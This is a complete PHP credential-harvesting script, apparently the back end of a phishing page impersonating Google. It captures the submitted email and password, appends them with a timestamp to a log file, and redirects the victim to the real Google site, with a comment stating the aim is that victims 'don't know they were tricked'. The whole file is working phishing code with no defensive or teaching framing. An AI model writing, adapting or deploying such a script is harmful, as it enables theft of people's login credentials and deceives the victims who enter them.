<?php
// Get the data sent from the form
$email = $_POST['user'];
$password = $_POST['pass'];

// Create a timestamp
$date = date('F j, Y, g:i a');

// Format the data to look nice in the file
$data = "Email: $email\nPassword: $password\nDate: $date\n-------------------\n";

// Save it to a file named "log.txt"
file_put_contents('log.txt', $data, FILE_APPEND);

// Redirect the user to the REAL Google page so they don't know they were tricked
header("Location: https://www.google.com");
exit();
?>